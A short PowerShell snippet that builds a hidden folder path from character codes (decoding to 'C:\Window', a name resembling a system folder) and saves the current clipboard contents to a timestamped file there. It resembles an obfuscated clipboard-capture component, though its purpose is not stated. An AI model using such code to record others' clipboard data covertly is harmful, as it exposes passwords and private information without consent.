$55 = $([char]67 + [char]58 + [char]92 + [char]87 + [char]105 + [char]110 + [char]100 + [char]111 + [char]119)
Get-Date -Format "yyyyMMdd_HHmmss" | ForEach-Object {
  $z = "$55\set_$_.txt"
  Get-Clipboard | Set-Content $z
}
